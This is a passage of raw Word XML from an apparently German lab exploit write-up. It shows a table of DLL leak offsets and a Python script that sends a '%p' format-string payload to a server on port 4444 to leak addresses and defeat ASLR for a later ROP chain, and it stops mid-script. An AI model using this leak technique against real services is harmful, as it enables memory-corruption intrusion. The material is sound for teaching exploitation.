          </w:tcPr>
          <w:p w14:paraId="51090736" w14:textId="5AA35352" w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w:rsidRDefault="00C101F6" w:rsidP="00C101F6">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>DLL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="62667FC0" w14:textId="46C052B8" w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w:rsidRDefault="00C101F6" w:rsidP="00C101F6">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Offset</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w14:paraId="77BC9947" w14:textId="77777777" w:rsidTr="00C101F6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5A93D8ED" w14:textId="4EF9AA0A" w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w:rsidRDefault="00C101F6" w:rsidP="00C101F6">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="74F5DACE" w14:textId="59E4DE35" w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w:rsidRDefault="00C076BA" w:rsidP="00C101F6">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>WS_32.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="16D80175" w14:textId="3D6AADFE" w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w:rsidRDefault="00C076BA" w:rsidP="00C101F6">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>6C19</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w14:paraId="5ECA61DF" w14:textId="77777777" w:rsidTr="00C101F6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="19512657" w14:textId="3D1EEB18" w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w:rsidRDefault="00C101F6" w:rsidP="00C101F6">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5938A0A9" w14:textId="6C0CC385" w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w:rsidRDefault="00C076BA" w:rsidP="00C101F6">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>UCRTBASE.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6C78510D" w14:textId="29EF814F" w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w:rsidRDefault="00C076BA" w:rsidP="00C101F6">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>CE76C</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w14:paraId="4BE729FB" w14:textId="77777777" w:rsidTr="00C101F6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1519957C" w14:textId="13D42BA1" w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w:rsidRDefault="00C101F6" w:rsidP="00C101F6">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>158 / 159</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="118877FD" w14:textId="25FCADFE" w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w:rsidRDefault="00C076BA" w:rsidP="00C101F6">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Kernel32.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3020" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3B6FD264" w14:textId="4E22C12C" w:rsidR="00C101F6" w:rsidRPr="00B47CB9" w:rsidRDefault="000F7672" w:rsidP="00C101F6">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>4EF6C</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="04A98393" w14:textId="515A80B6" w:rsidR="00510B3C" w:rsidRPr="00B47CB9" w:rsidRDefault="00510B3C" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FBDEE21" w14:textId="6D4EA334" w:rsidR="000F7672" w:rsidRPr="00B47CB9" w:rsidRDefault="005651C9" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidR="00203450" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">as leaked_adresses Python Skript wurde daraufhin erweitert, damit </w:t>
      </w:r>
      <w:r w:rsidR="003C6098" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>die Base Adresse dynamisch ermittelt werden kann. Das wird später für die Rop Chain benötigt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="513B8543" w14:textId="1EE9E6AA" w:rsidR="000F7672" w:rsidRPr="00B47CB9" w:rsidRDefault="000F7672" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="006F1783" w:rsidRPr="00B47CB9" w14:paraId="49B00B85" w14:textId="77777777" w:rsidTr="006F1783">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6B15CEF1" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#!/usr/bin/python</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EB0D854" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import socket</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2167F432" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C0FE84C" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="794F860B" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>def getAslrBase():</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AD65D69" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    numberOfChars = 172</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CCA8A72" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    char = b"%p&gt;"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="512DF049" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    buffer = char * numberOfChars</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A67F530" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    fileName = 'leaked_adresses_1.txt'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31361605" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="02F780A8" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    startLenght = 20</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C0F6167" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    bufferLenght = numberOfChars * 9 + startLenght</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2518AB5A" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="3E725AB6" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    connect=s.connect(('10.0.2.12', 4444)) # hardcoded IP address</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="440EC8BD" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0637E596" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(bytes('C \r\n', 'utf-8'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="296F66B0" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31C33472" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(buffer + bytes('\r\n', 'utf-8'))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28BFD055" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    data = b""</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61A81B54" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="092D462D" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    while(len(data)&lt;bufferLenght):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28E9EBF7" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        data += s.recv(bufferLenght)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="310E1E60" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="05B012D5" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.send(bytes('n\r\n', 'utf-8')) # evil buffer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4ECF3392" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    s.close()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DFA38BC" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="035F7631" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # remove unnecessary line which are send by the server</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0045ECE1" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    string = data.decode("utf-8")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="159D1443" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    string = string.replace("Neuer Topic: ", "")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="461EFB60" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="00B47CB9" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>string = string.replace("\r\nIst die Aenderung akzeptabel [y/n]:", "")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D9E5A17" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>string = string.replace("&gt;", "\r\n")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EF2E399" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="371223BF" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # write into the file</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DF234F2" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    f = open(fileName, "w")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FE60A98" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    f.write(string)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17314B87" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    f.close()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="592B3982" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6A4A044B" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    # open the file and put the leaked addresses in an array</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3493A9CF" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    infile = open(fileName, 'r')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FE627A5" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    lines = infile.readlines()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B8B9651" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    leakedAdresses = []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1512962B" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0517A2F3" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    for line in lines:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76D30802" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">        leakedAdresses.append(line)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18E73CB9" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7A1152C1" w14:textId="77777777" w:rsidR="006F1783" w:rsidRPr="004D58C1" w:rsidRDefault="006F1783" w:rsidP="006F1783">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t xml:space="preserve">    #calculation of ucrtbase base</w:t>
            </w:r>
          </w:p>
